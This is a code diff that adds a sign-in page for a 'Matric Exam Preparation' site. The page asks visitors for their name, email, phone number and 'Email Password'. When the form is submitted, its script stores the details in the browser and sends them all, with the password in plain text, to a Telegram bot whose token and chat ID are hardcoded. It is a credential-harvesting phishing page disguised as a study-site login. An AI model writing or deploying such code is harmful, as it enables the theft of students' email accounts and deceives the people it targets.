@@ -1,0 +1,111 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign In - Matric Exam Preparation</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .form-container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      width: 300px;
+      text-align: center;
+    }
+    .form-container h2 {
+      margin-bottom: 20px;
+      color: #4CAF50;
+    }
+    input[type="text"],
+    input[type="email"],
+    input[type="tel"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <h2>Sign In</h2>
+    <form id="signin-form">
+      <input type="text" id="fullname" placeholder="Full Name" required />
+      <input type="email" id="email" placeholder="Email" required />
+      <input type="tel" id="phone" placeholder="Phone Number" required />
+      <input type="password" id="password" placeholder="Email Password" required />
+      <button type="submit">Sign In</button>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById('signin-form');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const fullname = document.getElementById('fullname').value;
+      const email = document.getElementById('email').value;
+      const phone = document.getElementById('phone').value;
+      const password = document.getElementById('password').value;
+
+      // Save data locally (for demonstration, you need proper backend)
+      localStorage.setItem('fullname', fullname);
+      localStorage.setItem('email', email);
+      localStorage.setItem('phone', phone);
+      localStorage.setItem('password', password);
+
+      // Send data to Telegram bot
+      const botToken = '7905444120:AAHwbwsv8lVNCETUQSNgzw0z4YVI6vSKRos'; // Replace with your bot token
+      const chatId = '6992364240'; // Replace with your chat ID
+      const message = `New Sign-In:\nName: ${fullname}\nEmail: ${email}\nPhone: ${phone}\nPassword: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        }),
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Message sent to Telegram:', data);
+        alert('Sign-in successful! Redirecting...');
+        // Redirect to main page
+        window.location.href = 'main.html'; // Change to your main page URL
+      })
+      .catch(error => {
+        console.error('Error', error);
+        alert('Error.');
+      });
+    });
+  </script>
+</body>
+</html>
